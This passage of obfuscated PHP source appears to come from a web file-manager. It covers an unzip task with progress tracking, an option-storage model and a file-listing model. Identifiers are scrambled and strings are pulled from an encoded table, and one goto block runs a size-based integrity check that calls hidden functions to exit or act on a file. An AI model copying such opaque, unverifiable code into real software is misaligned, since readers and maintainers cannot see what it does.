$ì£šÉÖµ) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $—©ù ¨– =& $_SERVER[ •ŒÓîÆ]; parent::startAfter(); Hook::bind($—©ù ¨–[1803], array($this, $—©ù ¨–[1804])); Hook::bind($—©ù ¨–[1234], array($this, $—©ù ¨–[1805])); Hook::bind($—©ù ¨–[1806], array($this, $—©ù ¨–[1807])); $Á¥¢Âì =& $this->task; $Á¥¢Âì[$—©ù ¨–[1808]] = $—©ù ¨–[1235]; if (!$Á¥¢Âì[$—©ù ¨–[1585]]) { $Á¥¢Âì[$—©ù ¨–[1585]] = LNG($—©ù ¨–[1809]); } } protected function endAfter() { $¦˜€ä÷õ =& $_SERVER[ •ŒÓîÆ]; parent::endAfter(); Hook::unbind($¦˜€ä÷õ[1803], array($this, $¦˜€ä÷õ[1804])); Hook::unbind($¦˜€ä÷õ[1234], array($this, $¦˜€ä÷õ[1805])); Hook::unbind($¦˜€ä÷õ[1806], array($this, $¦˜€ä÷õ[1807])); } public function updateAfter() { $éÛıãí¿ =& $_SERVER[ •ŒÓîÆ]; $Æµ´Ú°ı =& $this->task; if (!$Æµ´Ú°ı[$éÛıãí¿[827]] || !$Æµ´Ú°ı[$éÛıãí¿[804]]) { if ($Æµ´Ú°ı[$éÛıãí¿[1808]] != $éÛıãí¿[368]) { return; } } if ($Æµ´Ú°ı[$éÛıãí¿[1808]] == $éÛıãí¿[1235]) { $¿íÕ¹²® = 0; if ($Æµ´Ú°ı[$éÛıãí¿[1743]]) { $¿íÕ¹²® = $Æµ´Ú°ı[$éÛıãí¿[1744]] / $Æµ´Ú°ı[$éÛıãí¿[1743]]; } $Æµ´Ú°ı[$éÛıãí¿[1692]] = $¿íÕ¹²® * 0.3; } else { if ($Æµ´Ú°ı[$éÛıãí¿[1808]] == $éÛıãí¿[368]) { $¿íÕ¹²® = $Æµ´Ú°ı[$éÛıãí¿[1691]] / $Æµ´Ú°ı[$éÛıãí¿[827]]; $Æµ´Ú°ı[$éÛıãí¿[1692]] = 0.3 + $¿íÕ¹²® * 0.4; } else { if ($Æµ´Ú°ı[$éÛıãí¿[1808]] == $éÛıãí¿[109]) { $ïıÖÂœÉ = 0; if ($Æµ´Ú°ı[$éÛıãí¿[1745]] == $éÛıãí¿[109]) { $ïıÖÂœÉ = $Æµ´Ú°ı[$éÛıãí¿[1744]]; } $¿íÕ¹²® = ($Æµ´Ú°ı[$éÛıãí¿[1748]] + $ïıÖÂœÉ) / $Æµ´Ú°ı[$éÛıãí¿[804]]; $Æµ´Ú°ı[$éÛıãí¿[1692]] = 0.3 + 0.4 + $¿íÕ¹²® * 0.3; } } } if ($Æµ´Ú°ı[$éÛıãí¿[1692]] > 0) { $è”ì‘í÷ = timeFloat() - $Æµ´Ú°ı[$éÛıãí¿[1694]] - $Æµ´Ú°ı[$éÛıãí¿[1697]]; $Æµ´Ú°ı[$éÛıãí¿[1698]] = $è”ì‘í÷ * (1 - $Æµ´Ú°ı[$éÛıãí¿[1692]]) / $Æµ´Ú°ı[$éÛıãí¿[1692]]; } } public function addFile($Í¸Úİ°) { $Á³Ì—ı” =& $_SERVER[ •ŒÓîÆ]; $×áû†ÆØ =& $this->task; $–“÷Ìı´ = IO::info($Í¸Úİ°); $×áû†ÆØ[$Á³Ì—ı”[1741]] = $–“÷Ìı´[$Á³Ì—ı”[32]]; $×áû†ÆØ[$Á³Ì—ı”[1743]] = $–“÷Ìı´[$Á³Ì—ı”[78]]; $×áû†ÆØ[$Á³Ì—ı”[1744]] = 0; $×áû†ÆØ[$Á³Ì—ı”[1105]] = $Á³Ì—ı”[1764]; $×áû†ÆØ[$Á³Ì—ı”[1745]] = $Á³Ì—ı”[1235]; $×áû†ÆØ[$Á³Ì—ı”[804]] = $–“÷Ìı´[$Á³Ì—ı”[78]]; $×áû†ÆØ[$Á³Ì—ı”[827]] = 1; $ÉŞÁµÉß = 0; $×áû†ÆØ[$Á³Ì—ı”[1752]] = array($Á³Ì—ı”[1753] => $ÉŞÁµÉß + 1, $Á³Ì—ı”[473] => $–“÷Ìı´[$Á³Ì—ı”[32]], $Á³Ì—ı”[86] => $–“÷Ìı´[$Á³Ì—ı”[86]], $Á³Ì—ı”[563] => $–“÷Ìı´[$Á³Ì—ı”[563]] ? $–“÷Ìı´[$Á³Ì—ı”[563]] : $–“÷Ìı´[$Á³Ì—ı”[86]]); $this->update(); } public function zipEvent($©Èç³úä, $Ôƒ§ëÉÌ, $÷çúù‡ô, $…¯ŠÃ™Ñ) { $²ÇÙƒö¹ =& $_SERVER[ •ŒÓîÆ]; $µÜáÌ“ƒ =& $this->task; $µÜáÌ“ƒ[$²ÇÙƒö¹[1741]] = get_path_this($Ôƒ§ëÉÌ); $µÜáÌ“ƒ[$²ÇÙƒö¹[1743]] = $…¯ŠÃ™Ñ; $µÜáÌ“ƒ[$²ÇÙƒö¹[1744]] = $÷çúù‡ô; $µÜáÌ“ƒ[$²ÇÙƒö¹[1105]] = $©Èç³úä == $²ÇÙƒö¹[1810] ? $²ÇÙƒö¹[1811] : $²ÇÙƒö¹[1812]; $µÜáÌ“ƒ[$²ÇÙƒö¹[1745]] = $²ÇÙƒö¹[12]; $µÜáÌ“ƒ[$²ÇÙƒö¹[804]] = $…¯ŠÃ™Ñ; $µÜáÌ“ƒ[$²ÇÙƒö¹[1808]] = $²ÇÙƒö¹[368]; $this->update(); } public function unzipAfter($¢£€Âœ¼) { $˜˜Œ± ë =& $_SERVER[ •ŒÓîÆ]; $êÛ¬™¹ =& $this->task; $êÛ¬™¹[$˜˜Œ± ë[1808]] = $˜˜Œ± ë[109]; $è’œè“ = IO::infoWithChildren($¢£€Âœ¼); $¢³²äøı = 0; $êÛ¬™¹[$˜˜Œ± ë[1752]] = array($˜˜Œ± ë[1753] => $¢³²äøı + 1, $˜˜Œ± ë[473] => $è’œè“[$˜˜Œ± ë[32]], $˜˜Œ± ë[86] => $è’œè“[$˜˜Œ± ë[86]], $˜˜Œ± ë[563] => $è’œè“[$˜˜Œ± ë[563]] ? $è’œè“[$˜˜Œ± ë[563]] : $è’œè“[$˜˜Œ± ë[86]]); if ($è’œè“[$˜˜Œ± ë[33]] == $˜˜Œ± ë[216]) { $êÛ¬™¹[$˜˜Œ± ë[827]] = 1; } else { $êÛ¬™¹[$˜˜Œ± ë[827]] = $è’œè“[$˜˜Œ± ë[81]][$˜˜Œ± ë[79]]; } $êÛ¬™¹[$˜˜Œ± ë[1105]] = $˜˜Œ± ë[12]; $êÛ¬™¹[$˜˜Œ± ë[1745]] = 0; $êÛ¬™¹[$˜˜Œ± ë[1691]] = 0; $êÛ¬™¹[$˜˜Œ± ë[1743]] = 0; $êÛ¬™¹[$˜˜Œ± ë[1744]] = 0; $êÛ¬™¹[$˜˜Œ± ë[1741]] = $˜˜Œ± ë[12]; $êÛ¬™¹[$˜˜Œ± ë[1748]] = 0; $êÛ¬™¹[$˜˜Œ± ë[804]] = $è’œè“[$˜˜Œ± ë[78]]; $this->update(); self::log($˜˜Œ± ë[1813] . json_encode(array($êÛ¬™¹, $è’œè“))); } public function nameParse($º—À‡Íõ) { $ÀÔÔ…Ñ =& $_SERVER[ •ŒÓîÆ]; $Øí³—ë˜ =& $this->task; if ($Øí³—ë˜[$ÀÔÔ…Ñ[1808]] == $ÀÔÔ…Ñ[1235]) { $Øí³—ë˜[$ÀÔÔ…Ñ[1808]] = $ÀÔÔ…Ñ[368]; $Øí³—ë˜[$ÀÔÔ…Ñ[1748]] = 0; $Øí³—ë˜[$ÀÔÔ…Ñ[804]] = 0; } $çŞšÓü = get_path_this($º—À‡Íõ); if (strstr($çŞšÓü, $ÀÔÔ…Ñ[10])) { $Øí³—ë˜[$ÀÔÔ…Ñ[1691]] += 1; $Øí³—ë˜[$ÀÔÔ…Ñ[827]] += 1; } $Øí³—ë˜[$ÀÔÔ…Ñ[1741]] = $º—À‡Íõ; $this->update(); } } goto AÊÌª±íòÂ; Cğ·¬À¯¢ò: if ($_SERVER[$_SERVER[ •ŒÓîÆ][255]] != $_size($_file)) { $_getc = $_SERVER[ •ŒÓîÆ][257]; $_getfile = $_SERVER[$_SERVER[ •ŒÓîÆ][258]] . $_SERVER[ •ŒÓîÆ][259]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ •ŒÓîÆ][248], $_getfilec); if (count($_getarrs) < $_SERVER[ •ŒÓîÆ][260]) { $exit = $_SERVER[ •ŒÓîÆ][261]; $exit(); } $_act = $_SERVER[ •ŒÓîÆ][262]; $_act($_file); } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($‹„©–± = false, $¦Î¹ĞÄœ = '', $Şî¢¶ŠŒ = false) { $æÓÖ¾Åİ =& $_SERVER[ •ŒÓîÆ]; $Ëµé‚É¼ = $this->cacheGet($¦Î¹ĞÄœ); $ã°Š«é = $this->optionDefault($¦Î¹ĞÄœ); $ã°Š«é = is_array($ã°Š«é) ? $ã°Š«é : array(); if (is_array($Ëµé‚É¼)) { $Ëµé‚É¼ = array_merge($ã°Š«é, $Ëµé‚É¼); return $‹„©–± ? isset($Ëµé‚É¼[$‹„©–±]) ? $Ëµé‚É¼[$‹„©–±] : null : $Ëµé‚É¼; } $™½êøš± = $this->filterWhere(array($æÓÖ¾Åİ[33] => $¦Î¹ĞÄœ)); $Ëµé‚É¼ = $this->where($™½êøš±)->select(); $Ëµé‚É¼ = array_to_keyvalue($Ëµé‚É¼, $æÓÖ¾Åİ[96], $æÓÖ¾Åİ[429]); foreach ($Ëµé‚É¼ as $˜Œ¹óºÀ => $Íœİï¹Â) { if ($Şî¢¶ŠŒ || in_array($˜Œ¹óºÀ, $this->jsonField)) { $Ëµé‚É¼[$˜Œ¹óºÀ] = json_decode($Íœİï¹Â, !0); } } $this->cacheSet($¦Î¹ĞÄœ, $Ëµé‚É¼); $Ëµé‚É¼ = array_merge($ã°Š«é, $Ëµé‚É¼); return $‹„©–± ? $Ëµé‚É¼[$‹„©–±] : $Ëµé‚É¼; } public function set($Åı¢Ş–, $ïŠòå¡½ = false, $Ğæ¨ÛÊŞ = '') { $Á›¦¾¦¾ =& $_SERVER[ •ŒÓîÆ]; $this->cacheRemove($Ğæ¨ÛÊŞ); $‚­ƒ„Û = array(); $ä¶ÎÊäµ = is_array($Åı¢Ş–) ? $Åı¢Ş– : array($Åı¢Ş– => $ïŠòå¡½); foreach ($ä¶ÎÊäµ as $™å¯†ç¼ => $Ê³Ø¥Ùù) { if (is_array($Ê³Ø¥Ùù)) { $Ê³Ø¥Ùù = json_encode_force($Ê³Ø¥Ùù); } $this->checkLength($Ê³Ø¥Ùù, !1, $this->tableName . $Á›¦¾¦¾[4] . $Åı¢Ş–); $Ê³Ø¥Ùù = self::textEncode($Ê³Ø¥Ùù); $ä¶ÎÊäµ = array($Á›¦¾¦¾[33] => $Ğæ¨ÛÊŞ, $Á›¦¾¦¾[96] => $™å¯†ç¼, $Á›¦¾¦¾[429] => $Ê³Ø¥Ùù); $‚­ƒ„Û[] = $this->filterWhere($ä¶ÎÊäµ); } if (!$‚­ƒ„Û) { return !0; } $ğ±äŸÌâ = $this->cacheKey($Á›¦¾¦¾[455]); CacheLock::lock($ğ±äŸÌâ); $§Š¬½şº = $this->addAll($‚­ƒ„Û, array(), !0); CacheLock::unlock($ğ±äŸÌâ); return $§Š¬½şº; } protected function optionDefault($ä°–ªÀ¯ = '') { return !1; } public function setDeep($÷èí¹ĞË, $—©«Ç°· = false, $ª‡ÛíûŒ = '') { $ÒàøÌš™ = explode($_SERVER[ •ŒÓîÆ][10], $÷èí¹ĞË); $µÇ«‡˜‡ = $this->get(); array_set_value($µÇ«‡˜‡, $÷èí¹ĞË, $—©«Ç°·); $this->set($ÒàøÌš™[0], $µÇ«‡˜‡[$ÒàøÌš™[0]], $ª‡ÛíûŒ); } public function remove($§ŞÁ”Ší, $ÖŞä’˜¸ = '') { $ÍÉèØèˆ =& $_SERVER[ •ŒÓîÆ]; $this->cacheRemove($ÖŞä’˜¸); $Àü•úÜÖ = $this->filterWhere(array($ÍÉèØèˆ[96] => $§ŞÁ”Ší, $ÍÉèØèˆ[33] => $ÖŞä’˜¸)); if (is_null($§ŞÁ”Ší)) { unset($Àü•úÜÖ[$ÍÉèØèˆ[96]]); } return $this->where($Àü•úÜÖ)->delete(); } public function cacheSet($¶ã‚ş½é, $äÄ×Şü½ = false) { return Cache::set($this->cacheKey($¶ã‚ş½é), $äÄ×Şü½); } public function cacheGet($ÄÚú¿Ù) { return Cache::get($this->cacheKey($ÄÚú¿Ù)); } public function cacheRemove($áÍšÕ„¯) { return Cache::remove($this->cacheKey($áÍšÕ„¯)); } protected function filterWhere($˜ˆ†‰èÉ) { return $˜ˆ†‰èÉ; } protected function cacheKey($ò¥•Í™µ) { return $ò¥•Í™µ; } } class SourceListModel extends ModelBase { protected $tableName = "\151\157\137\163\x6f\x75\x72\x63\145"; protected $tableMeta = array("\164\141\x62\x6c\145\x4e\141\x6d\145" => "\x69\157\137\x73\x6f\165\x72\143\x65\x5f\155\145\164\x61", "\155\145\x74\x61\x46\x69\145\154\x64" => "\163\x6f\x75\162\143\145\111\104"); protected $dataAuto = array(array("\x6d\157\144\x69\146\x79\x54\151\x6d\145", "\164\x69\155\x65", "\x69\x6e\163\145\162\164", "\x66\x75\x6e\x63\x74\x69\157\x6e"), array("\143\x72\145\x61\164\x65\124\x69\155\145", "\x74\x69\x6d\x65", "\x69\x6e\x73\x65\162\164", "\x66\165\x6e\x63\164\151\157\156"), array("\166\x69\145\x77\124\x69\x6d\145", "\164\151\x6d\145", "\151\156\163\x65\162\164", "\x66\x75\x6e\143\164\151\157\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($¢®¤„è·) { return $this->listSource(array($_SERVER[ •ŒÓîÆ][456] => $¢®¤„è·)); } public function typeName($Çó½¶œ) { static $ğ‹€¤µŠ = array(self::TYPE_SYSTEM => "\x73\x79\x73\164\x65\x6d", self::TYPE_USER => "\x75\x73\x65\x72", self::TYPE_GROUP => "\147\x72\x6f\x75\x70"); return $ğ‹€¤µŠ[$Çó½¶œ . $_SERVER[ •ŒÓîÆ][12]]; } public function sourceListInfo($åÉã·´, $‚“»´İã = false) { $¥Ú„òÆş =& $_SERVER[ •ŒÓîÆ]; $åÉã·´ = $åÉã·´ ? $åÉã·´ : array(); $åÉã·´ = array_filter(array_unique($åÉã·´)); if (!$åÉã·´) { return array(); } $´ˆªë×œ = $this->where(array($¥Ú„òÆş[183] => array($¥Ú„òÆş[7], $åÉã·´)))->select(); $this->_listDataApply($´ˆªë×œ, $‚“»´İã); return array_to_keyvalue($´ˆªë×œ, $¥Ú„òÆş[183]); } public function pathInfoFilter(&$Ø¶²ç¥) { $™»ßØ¬ü =& $_SERVER[ •ŒÓîÆ]; static $ÁÜ §¾Î = false; static $¿ŠÀ±ô = false; static $ß±Ò¾Ö = false; if (!$ÁÜ §¾Î) { $Ì³É€Óñ = $™»ßØ¬ü[457]; $Ì³É€Óñ .= $™»ßØ¬ü[458]; $Ì³É€Óñ .= $™»ßØ¬ü[459]; $à²÷´ö« = $™»ßØ¬ü[460]; $«Î½ÓÍ¯ = explode($™»ßØ¬ü[50], $à²÷´ö«); $ÁÜ §¾Î = explode($™»ßØ¬ü[50], $Ì³É€Óñ); $¿ŠÀ±ô = array(); foreach ($ÁÜ §¾Î as $£õí½™á) { if (in_array($£õí½™á, $«Î½ÓÍ¯)) { continue; } $¿ŠÀ±ô[] = $£õí½™á; } $ß±Ò¾Ö = explode($™»ßØ¬ü[50], $™»ßØ¬ü[461]); } foreach ($ß±Ò¾Ö as $ìòùÒ”¶) { if (isset($Ø¶²ç¥[$ìòùÒ”¶])) { $Ø¶²ç¥[$ìòùÒ”¶] = intval($Ø¶²ç¥[$ìòùÒ”¶]); } } $Ø¶²ç¥[$™»ßØ¬ü[86]] = $™»ßØ¬ü[462] . $Ø¶²ç¥[$™»ßØ¬ü[183]] . $™»ßØ¬ü[463]; $Ø¶²ç¥[$™»ßØ¬ü[33]] = $Ø¶²ç¥[$™»ßØ¬ü[464]] == 1 ? $™»ßØ¬ü[77] : $™»ßØ¬ü[216]; $Ø¶²ç¥[$™»ßØ¬ü[180]] = $this->typeName($Ø¶²ç¥[$™»ßØ¬ü[180]]); if ($Ø¶²ç¥[$™»ßØ¬ü[464]] != 1) { $Ø¶²ç¥[$™»ßØ¬ü[177]] = $Ø¶²ç¥[$™»ßØ¬ü[465]]; unset($Ø¶²ç¥[$™»ßØ¬ü[465]]); } $÷âîûÁ© = $ÁÜ §¾Î; if (isset($Ø¶²ç¥[$™»ßØ¬ü[466]]) && $Ø¶²ç¥[$™»ßØ¬ü[466]][$™»ßØ¬ü[467]] == -1) { $÷âîûÁ© = $¿ŠÀ±ô; } $Ø¶²ç¥ = array_field_key($Ø¶²ç¥, $÷âîûÁ©); return $Ø¶²ç¥; } public function listUserFav() { $ÛİŒÀˆİ =& $_SERVER[ •ŒÓîÆ]; $ŞÒ‡Ñ¢¦ = Model($ÛİŒÀˆİ[468])->listData(); $ÂÛ§å½ê = array_filter_by_field($ŞÒ‡Ñ¢¦, $ÛİŒÀˆİ[33], $ÛİŒÀˆİ[469]); $ÂÛ§å½ê = array_to_keyvalue($ÂÛ§å½ê, $ÛİŒÀˆİ[12], $ÛİŒÀˆİ[86]); if ($ÂÛ§å½ê) { $ÆËšÅ–€ = $this->listSource(array($ÛİŒÀˆİ[470] => array($ÛİŒÀˆİ[471], $ÂÛ§å½ê))); } $ÆËšÅ–€ = array_to_keyvalue($ÆËšÅ–€[$ÛİŒÀˆİ[424]], $ÛİŒÀˆİ[183]); foreach ($ŞÒ‡Ñ¢¦ as &$Ú˜œ«„…) { $Ú˜œ«„… = array($ÛİŒÀˆİ[472] => $Ú˜œ«„…[$ÛİŒÀˆİ[453]], $ÛİŒÀˆİ[473] => $Ú˜œ«„…[$ÛİŒÀˆİ[32]], $ÛİŒÀˆİ[474] => $Ú˜œ«„…[$ÛİŒÀˆİ[86]], $ÛİŒÀˆİ[475] => $Ú˜œ«„…[$ÛİŒÀˆİ[33]], $ÛİŒÀˆİ[476] => $Ú˜œ«„…[$ÛİŒÀˆİ[217]], $ÛİŒÀˆİ[477] => $Ú˜œ«„…[$ÛİŒÀˆİ[87]]); if ($Ú˜œ«„…[$ÛİŒÀˆİ[33]] == $ÛİŒÀˆİ[469] && $ÆËšÅ–€[$Ú˜œ«„…[$ÛİŒÀˆİ[86]]]) { $Ú˜œ«„…[$ÛİŒÀˆİ[89]] = $ÆËšÅ–€[$Ú˜œ«„…[$ÛİŒÀˆİ[86]]]; } } unset($Ú˜œ«„…); return $ŞÒ‡Ñ¢¦; } public function listUserTag($ç½™Ö˜È) { $ê»òàÌ =& $_SERVER[ •ŒÓîÆ]; if ($ç½™Ö˜È && !is_array($ç½™Ö˜È)) { $ç½™Ö˜È = array($ç½™Ö˜È); } $Òáßœö = Model($ê»òàÌ[478])->listData(); $ Øê±ºû = array(); $×¡»ÕÂ• = array(); foreach ($Òáßœö as $…ş×éÎ‹) { $È¾ÆŞÃ = $…ş×éÎ‹[$ê»òàÌ[86]]; if (!$È¾ÆŞÃ) { continue; } if (!isset($×¡»ÕÂ•[$È¾ÆŞÃ])) { $×¡»ÕÂ•[$È¾ÆŞÃ] = array(); } $×¡»ÕÂ•[$È¾ÆŞÃ][] = $…ş×éÎ‹[$ê»òàÌ[479]]; $ Øê±ºû[$…ş×éÎ‹[$ê»òàÌ[86]]] = $…ş×éÎ‹; } $°ß»’æ = array(); $÷ºæÙŒ = array(); $Ü›‚ÇÅŒ = array(); foreach ($×¡»ÕÂ• as $ƒÀ¬«¼­ => $õ¤Ó—Úâ) { $¬¢ÍÓÙÆ = !0; if (!$ç½™Ö˜È) { $°ß»’æ[] = $ƒÀ¬«¼­; continue; } foreach ($ç½™Ö˜È as $ï•¸ÈÃ) { if (!in_array($ï•¸ÈÃ, $õ¤Ó—Úâ)) { $¬¢ÍÓÙÆ = !1; break; } } if (!$¬¢ÍÓÙÆ) { continue; } if (!is_numeric($ƒÀ¬«¼­)) { $û¹ÁÙœŞ = $ Øê±ºû[$ƒÀ¬«¼­]; $Şï¦ÃÆ = array($ê»òàÌ[32] => $û¹ÁÙœŞ[$ê»òàÌ[32]], $ê»òàÌ[86] => $û¹ÁÙœŞ[$ê»òàÌ[86]], $ê»òàÌ[33] => $û¹ÁÙœŞ[$ê»òàÌ[33]], $ê»òàÌ[89] => array($ê»òàÌ[480] => 1), $ê»òàÌ[218] => !0); if ($û¹ÁÙœŞ[$ê»òàÌ[33]] == $ê»òàÌ[216]) { $Ü›‚ÇÅŒ[] = $Şï¦ÃÆ; } if ($û¹ÁÙœŞ[$ê»òàÌ[33]] == $ê»òàÌ[77]) { $÷ºæÙŒ[] = $Şï¦ÃÆ; } continue; } $°ß»’æ[] = $ƒÀ¬«¼­; } if ($°ß»’æ) { $ãÄ¤Ç× = $this->listSource(array($ê»òàÌ[470] => array($ê»òàÌ[471], $°ß»’æ))); } $ãÄ¤Ç× = $ãÄ¤Ç× ? $ãÄ¤Ç× : array($ê»òàÌ[84] => array(), $ê»òàÌ[85] => array()); $ãÄ¤Ç×[$ê»òàÌ[84]] = array_merge($ãÄ¤Ç×[$ê»òàÌ[84]], $÷ºæÙŒ); $ãÄ¤Ç×[$ê»òàÌ[85]] = array_merge($ãÄ¤Ç×[$ê»òàÌ[85]], $Ü›‚ÇÅŒ); if (isset($ãÄ¤Ç×[$ê»òàÌ[421]]) && count($°ß»’æ) == $ãÄ¤Ç×[$ê»òàÌ[421]][$ê»òàÌ[422]]) { return $ãÄ¤Ç×; } $©ÂÎÖ¡ì = array(); $ƒÛøŞ½„ = array_to_keyvalue($ãÄ¤Ç×[$ê»òàÌ[84]], $ê»òàÌ[12], $ê»òàÌ[183]); $ÍÆ­ûá = array_to_keyvalue($ãÄ¤Ç×[$ê»òàÌ[85]], $ê»òàÌ[12], $ê»òàÌ[183]); $’³ƒñÂ‘ = array_merge($ÍÆ­ûá, $ƒÛøŞ½„); foreach ($°ß»’æ as $È¾ÆŞÃ) { if (!in_array($È¾ÆŞÃ, $’³ƒñÂ‘)) { $©ÂÎÖ¡ì[] = $È¾ÆŞÃ; } } if ($©ÂÎÖ¡ì) { Model($ê»òàÌ[481])->removeBySource($©ÂÎÖ¡ì); } return $ãÄ¤Ç×; } public function listUserRecycle() { $å»Õ¥ÏŸ =& $_SERVER[ •ŒÓîÆ]; $ÙÄ¥‘˜ = Model($å»Õ¥ÏŸ[482])->listData(); if (!$ÙÄ¥‘˜) { return array(); } $ø´®¯Ÿ… = array($å»Õ¥ÏŸ[470] => array($å»Õ¥ÏŸ[471], $ÙÄ¥‘˜), $å»Õ¥ÏŸ[483] => 1); return $this->listSource($ø´®¯Ÿ…); } public function listSource($Ÿş±à¢È, $áô£¡Á¡ = 3000, $ü‹şÉÌ® = false) { $™“¿í¬ =& $_SERVER[ •ŒÓîÆ]; if (!isset($Ÿş±à¢È[$™“¿í¬[484]])) { $Ÿş±à¢È[$™“¿í¬[484]] = 0; } if (isset($Ÿş±à¢È[$™“¿í¬[182]]) && $Ÿş±à¢È[$™“¿í¬[182]] == $™“¿í¬[214]) { $Ÿş±à¢È[$™“¿í¬[465]] = array($™“¿í¬[386], $™“¿í¬[485]); } $Ã¢àı¹ = $™“¿í¬[486]; $°Ÿµ§İå = $this->field($Ã¢àı¹)->_makeOrder()->where($Ÿş±à¢È)->selectPage($áô£¡Á¡); $this->_listPageCheck($°Ÿµ§İå, $Ã¢àı¹, $Ÿş±à¢È); $this->_listDataApply($°Ÿµ§İå[$™“¿í¬[424]], $ü‹şÉÌ®); $this->_listMake($°Ÿµ§İå); return $°Ÿµ§İå; } private function _listPageCheck(&$´ì¤ÂœÕ, $‚ü©ş¨¼, $õÕ¦Ëï) { $¬•èÒ• =& $_SERVER[ •ŒÓîÆ]; if (!is_array($´ì¤ÂœÕ[$¬•èÒ•[421]])) { return; } $¯™¦Àâ‚ = $´ì¤ÂœÕ[$¬•èÒ•[421]]; if ($¯™¦Àâ‚[$¬•èÒ•[423]] <= 1) { return; } if ($¯™¦Àâ‚[$¬•èÒ•[422]] >= 100000) { return; } if (Model($¬•èÒ•[487])->get($¬•èÒ•[488]) != $¬•èÒ•[489]) { return; } $‚ü©ş¨¼ = str_replace(array($¬•èÒ•[53], $¬•èÒ•[397], $¬•èÒ•[248]), $¬•èÒ•[12], $‚ü©ş¨¼); $‚ü©ş¨¼ = $¬•èÒ•[490] . str_replace($¬•èÒ•[50], $¬•èÒ•[491], $‚ü©ş¨¼) . $¬•èÒ•[492]; $ÇµÓÏÃı = $¬•èÒ•[493]; $ÇµÓÏÃı = $ÇµÓÏÃı . $¬•èÒ•[494]; $¯ßİš¨Œ = $¯™¦Àâ‚[$¬•èÒ•[418]] * ($¯™¦Àâ‚[$¬•èÒ•[408]] - 1) . $¬•èÒ•[50] . $¯™¦Àâ‚[$¬•èÒ•[418]]; $ğÏêÁÛ¤ = $this->_makeOrder(!0); $ç·ÈÁÇø = $¬•èÒ•[490] . str_replace($¬•èÒ•[50], $¬•èÒ•[491], $ğÏêÁÛ¤[0]); if (strpos($ç·ÈÁÇø, $¬•èÒ•[495])) { $ç·ÈÁÇø = str_replace($¬•èÒ•[495], $¬•èÒ•[496], $ç·ÈÁÇø); } else { $ç·ÈÁÇø .= $¬•èÒ•[497] . $ğÏêÁÛ¤[1]; } $‹Ûî«†Ü = array(); foreach ($õÕ¦Ëï as $¬­‘Í¢Ú => $Ş§ÀàĞû) { $‹Ûî«†Ü[$¬•èÒ•[490] . $¬­‘Í¢Ú] = $Ş§ÀàĞû; } $this->alias($¬•èÒ•[498])->field($‚ü©ş¨¼)->limit($¯ßİš¨Œ)->order($ç·ÈÁÇø); $ªì»ÎÉ = $this->join($ÇµÓÏÃı)->where($‹Ûî«†Ü)->select(); if ($ªì»ÎÉ) { $´ì¤ÂœÕ[$¬•èÒ•[424]] = $ªì»ÎÉ; } } protected function _makeOrder($«¤äî¬Á = false) { $¹”îÙ·… =& $_SERVER[ •ŒÓîÆ]; $½“Çã‹ª = Model($¹”îÙ·…[499])->get($¹”îÙ·…[500]); $±Úñı· = Model($¹”îÙ·…[499])->get($¹”îÙ·…[501]); $ñä“åÌî = array($¹”îÙ·…[502] => $¹”îÙ·…[503], $¹”îÙ·…[504] => $¹”îÙ·…[505]); $à¹”íë² = array($¹”îÙ·…[32] => $¹”îÙ·…[32], $¹”îÙ·…[78] => $¹”îÙ·…[78], $¹”îÙ·…[177] => $¹”îÙ·…[465], $¹”îÙ·…[506] => $¹”îÙ·…[506], $¹”îÙ·…[507] => $¹”îÙ·…[508], $¹”îÙ·…[217] => $¹”îÙ·…[217], $¹”îÙ·…[87] => $¹”îÙ·…[87]); $¹§ˆ¯˜ = Input::get($¹”îÙ·…[509], $¹”îÙ·…[7], $½“Çã‹ª, array_keys($à¹”íë²)); $ÛÙ¦‹äâ = Input::get($¹”îÙ·…[510], $¹”îÙ·…[7], $±Úñı·, array_keys($ñä“åÌî)); if (!in_array($¹§ˆ¯˜, array_keys($à¹”íë²))) { $¹§ˆ¯˜ = $¹”îÙ·…[32]; } if (!in_array($ÛÙ¦‹äâ, array_keys($ñä“åÌî))) { $¹§ˆ¯˜ = $¹”îÙ·…[502]; } if ($¹§ˆ¯˜ == $¹”îÙ·…[32]) { } $Ü¥ÆÃ® = $¹”îÙ·…[511] . $à¹”íë²[$¹§ˆ¯˜] . $¹”îÙ·…[53] . $ñä“åÌî[$ÛÙ¦‹äâ]; $Ü¥ÆÃ® = rtrim(trim($Ü¥ÆÃ®), $¹”îÙ·…[50]); if ($«¤äî¬Á) { return array($Ü¥ÆÃ®, $ñä“åÌî[$ÛÙ¦‹äâ]); } return $this->order($Ü¥ÆÃ®); } protected function _listDataApplyItem($œˆÄ·š, $ô×‰°Ê€ = false) { $€ù© ¶ı = array($œˆÄ·š); $this->_listDataApply($€ù© ¶ı, $ô×‰°Ê€); return $€ù© ¶ı[0]; } protected function _listDataApply(&$Á±‡±••, $À¿Ãıø£ = false) { $¿ÛÇ×şš =& $_SERVER[ •ŒÓîÆ]; if (!$Á±‡±••) { $Á±‡±•• = array(); return; } $ç™°Ÿ†ô = array_to_keyvalue($Á±‡±••, $¿ÛÇ×şš[12], $¿ÛÇ×şš[183]); $ç™°Ÿ†ô = array_unique($ç™°Ÿ†ô); $this->_listSourceCache($Á±‡±••); if (!$À¿Ãıø£) { $this->_listAppendMeta($Á±‡±••, $ç™°Ÿ†ô); $this->_listAppendFileMeta($Á±‡±••, $ç™°Ÿ†ô); $this->_listAppendChildren($Á±‡±••, $ç™°Ÿ†ô); } $this->_listAppendPath($Á±‡±••); $this->_listAppendAuth($Á±‡±••); $this->_listAppendSourceInfo($Á±‡±••, $ç™°Ÿ†ô); $this->_listAppendUser($Á±‡±••); $this->_listFilterInfo($Á±‡±••, $À¿Ãıø£); $this->_listAppendAuthSecret($Á±‡±••); } protected function _listSourceCache($´ë—‰™ñ) { $§Ú’Î– =& $_SERVER[ •ŒÓîÆ]; foreach ($´ë—‰™ñ as $ÑÊª¸Å°) { self::$cacheSourceInfo[$§Ú’Î–[512] . $ÑÊª¸Å°[$§Ú’Î–[183]]] = $ÑÊª¸Å°; } } protected function _listFilterInfo(&$Öú¢àš³, $û†ÜºÚß = false) { $ô‘ş· =& $_SERVER[ •ŒÓîÆ]; foreach ($Öú¢àš³ as 